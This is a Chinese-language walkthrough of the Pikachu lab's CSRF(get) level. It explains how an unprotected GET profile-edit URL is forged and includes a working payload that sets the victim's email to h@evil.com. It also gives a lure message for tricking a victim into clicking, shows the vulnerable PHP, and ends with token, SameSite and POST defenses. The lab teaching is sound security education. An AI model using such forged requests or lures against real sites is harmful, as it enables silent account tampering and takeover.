# CSRF(get) 通关笔记
> 第一关 CSRF，也是最简单的一关：**修改个人信息的请求是一个 GET 链接，里面没有任何防护。**
>
> 攻击者只要把这个链接发给已经登录的受害者，他一点，信息就改了。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | CSRF → CSRF(get) |
| 登录页 | `http://pikachu/vul/csrf/csrfget/csrf_get_login.php` |
| 会员中心 | `http://pikachu/vul/csrf/csrfget/csrf_get.php` |
| 修改页 | `http://pikachu/vul/csrf/csrfget/csrf_get_edit.php` |
| 测试账号 | `vince` / `123456`（vince、allen、kobe、grady、kevin、lucy、lili，密码都是 123456） |
| 目标 | 在**不知道**受害者密码的情况下，改掉他的个人信息 |
---
## 二、我的解题步骤
### 步骤 1：先正常登录，看一遍流程
打开登录页，输入 `vince` / `123456`。
登录成功后跳到会员中心 `csrf_get.php`，显示：
```
hello,vince,欢迎来到个人会员中心 | 退出登录
姓名:vince
性别:boy
手机:18626545453
住址:chain
邮箱:vince@pikachu.com
[修改个人信息]
```
### 步骤 2：点「修改个人信息」，抓请求
点进去是 `csrf_get_edit.php`，一个表单：
| 字段 | 值 |
| --- | --- |
| sex | boy |
| phonenum | 18626545453 |
| add | chain |
| email | vince@pikachu.com |
点 submit，观察地址栏——**请求全在 URL 里**：
```
csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=vince@pikachu.com&submit=submit
```
**没有 token，没有验证码，没有旧密码校验。**
### 步骤 3：构造"伪造请求"
既然请求就是一条 URL，那就直接改了它：
```
http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacked&phonenum=110110&add=HACKED&email=h@evil.com&submit=submit
```
### 步骤 4：模拟受害者——在登录状态下访问这条 URL
保持登录，直接在浏览器里打开上面这条链接。
**页面跳回了会员中心，信息全部变了。**
### 步骤 5：确认改成功了
我实际跑了一遍，数据变化如下：
| 字段 | 修改前 | 修改后 |
| --- | --- | --- |
| 性别 | boy | **hacked** |
| 手机 | 18626545453 | **110110** |
| 住址 | chain | **HACKED** |
| 邮箱 | vince@pikachu.com | **h@evil.com** |
**全程没有输过一次密码。**
---
## 三、原理分析
### 3.1 修改页的源码
```php
$html1='';
if(isset($_GET['submit'])){
    if($_GET['sex']!=null && $_GET['phonenum']!=null && $_GET['add']!=null && $_GET['email']!=null){
        $getdata=escape($link, $_GET);
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:csrf_get.php");
        }
    }
}
```
三个关键点：
1. **参数全部来自 `$_GET`** —— 改成 URL 就能改数据
2. **没有 token 校验** —— 不验证请求是不是从本站发出的
3. **`where username='{$_SESSION['csrf']['username']}'`** —— 改的是**当前登录用户**，这对攻击者来说正好
### 3.2 为什么浏览器会"自动帮忙"
这是 CSRF 的核心机制：
```
受害者登录 → 服务器下发 PHPSESSID Cookie
        ↓
受害者访问攻击者的链接（同一个域名）
        ↓
浏览器自动带上 PHPSESSID
        ↓
服务器：Cookie 有效 → 认为是受害者本人 → 执行修改
```
**浏览器带上 Cookie 是自动行为，受害者完全无感。**
### 3.3 攻击者的完整操作
```
1. 自己注册一个账号，登录，抓包
2. 看到修改请求是一条 GET 链接
3. 把参数改成想改的值
4. 把链接发给受害者
5. 受害者登录状态下点了 → 信息被改
```
**攻击者从头到尾没有登录过受害者的账号。**
---
## 四、知识点与笔记
### 4.1 为什么 GET 型 CSRF 最容易打
| 原因 | 说明 |
| --- | --- |
| **请求就是一条 URL** | 可以直接贴在聊天、邮件、论坛里 |
| **点链接就会发请求** | 不需要表单，不需要 JS |
| **浏览器不弹任何提示** | 用户完全不知道发生了什么 |
相比之下，POST 型至少需要构造一个自动提交的表单页面。
### 4.2 真实场景长什么样
攻击者可以这样发送：
```
兄弟，帮我看下这个链接，我上传的照片打不开：
http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacked&phonenum=110110&add=HACKED&email=h@evil.com&submit=submit
```
或者用短链接伪装：
```
http://t.cn/xxxxxx
```
**用户看到的是一个"帮我看下"的链接，点开就是一次静默的信息修改。**
### 4.3 为什么"改密码"是 CSRF 的高危目标
如果修改密码也是这样一个 GET 请求：
```
/password.php?newpass=123456
```
那攻击者可以直接把受害者的密码改成自己的，然后**用自己的密码登录受害者的账号**。
这就是 CSRF 从"骚扰"升级成"接管账号"的路径。
### 4.4 怎么判断一个请求能不能被 CSRF
对着请求问三个问题：
| 问题 | 如果答案是"能" |
| --- | --- |
| 参数是否全部来自 URL / 表单，没有额外凭证？ | 能被伪造 |
| 服务器是否只靠 Cookie 判断身份？ | 能被伪造 |
| 操作是否会产生实际影响（增删改）？ | 值得打 |
三个都"是" → 存在 CSRF。
---
## 五、和 XSS 的区别（回顾）
| | CSRF | XSS |
| --- | --- | --- |
| 攻击者拿到身份了吗 | 没有 | 拿到了 |
| 用户要做什么 | 点链接 | 访问页面 |
| 危害范围 | 只能做那一个请求 | 能做任何事 |
| 防御 | token / 验证码 / 二次确认 | 输出转义 |
**这关的攻击者只能"改一次信息"，不能"登录进去随便看"。**
---
## 六、防御怎么写
### 6.1 加 token（最有效）
```php
// 生成
$_SESSION['token'] = bin2hex(random_bytes(32));
// 表单里带上
<input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
// 校验
if (!hash_equals($_SESSION['token'], $_POST['token'] ?? '')) {
    exit('非法请求');
}
unset($_SESSION['token']);   // 一次性
```
### 6.2 敏感操作改成 POST
```html
<form method="post" action="edit.php">
```
**GET 只用于查询，不做修改。**
### 6.3 检查 Referer / Origin
```php
$origin = $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '';
if (strpos($origin, 'https://your-site.com') !== 0) {
    exit('非法来源');
}
```
### 6.4 Cookie 加 SameSite
```php
session_set_cookie_params([
    'samesite' => 'Lax',
    'httponly' => true,
    'secure'   => true,
]);
```
`Lax` 之后，跨站的 GET 请求不会带上 Cookie——**这一条就能直接干掉本关的攻击。**
### 6.5 关键操作二次确认
改密码时要求输入旧密码：
```php
if (!password_verify($_POST['old_password'], $user['password'])) {
    exit('旧密码不正确');
}
```
**这一条对本关也有效**：攻击者不知道旧密码，改不了。
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 无防护的 GET 请求可以被伪造 |
| 关键点 | 参数全在 URL，没有 token |
| 攻击方式 | 受害者登录状态下点一条链接 |
| payload | `?sex=hacked&phonenum=110110&add=HACKED&email=h@evil.com&submit=submit` |
| 修复 | token + POST + SameSite |
**一句话**：
> **CSRF 不需要知道你密码，它只需要你在一次点击的时候刚好登录着。**
---
## 参考
- [OWASP: CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
